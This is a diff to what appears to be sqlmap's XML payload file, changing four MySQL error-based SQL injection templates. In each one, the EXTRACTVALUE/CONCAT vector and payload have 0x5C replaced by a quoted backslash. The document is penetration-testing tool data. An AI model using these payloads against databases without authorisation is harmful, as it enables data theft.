@@ -1016,9 +1016,9 @@ Formats:
         <risk>0</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>AND EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <vector>AND EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>AND EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1214,9 +1214,9 @@ Formats:
         <risk>2</risk>
         <clause>1</clause>
         <where>1</where>
-        <vector>OR EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <vector>OR EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>OR EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1439,9 +1439,9 @@ Formats:
         <risk>0</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))</vector>
+        <vector>(EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))</vector>
         <request>
-            <payload>(EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
+            <payload>(EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1560,9 +1560,9 @@ Formats:
         <risk>0</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
+        <vector>,EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>,EXTRACTVALUE([RANDNUM], CONCAT(0x5C, '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
+            <payload>,EXTRACTVALUE([RANDNUM], CONCAT('\', '[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
